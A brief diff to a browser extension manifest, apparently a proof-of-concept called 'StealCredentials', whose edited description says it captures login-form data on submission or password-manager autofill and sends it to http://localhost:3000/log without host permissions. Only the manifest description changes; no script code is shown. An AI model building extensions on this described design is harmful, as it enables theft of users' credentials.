@@ -2,7 +2,7 @@
     "manifest_version": 2,
 
     "name": "StealCredentials",
-    "description": "Extension that steals the data from an login form if the browser's password manager has filled in the credentials. Sends data to http://localhost:3000/log without the need for any host permissions" ,
+    "description": "Extension that steals the data from an login form. Either when the user submits the form or if the browser's password manager has filled in the credentials. Sends data to http://localhost:3000/log without the need for any host permissions." ,
     "version": "1.0",
 
 	"content_scripts" : [
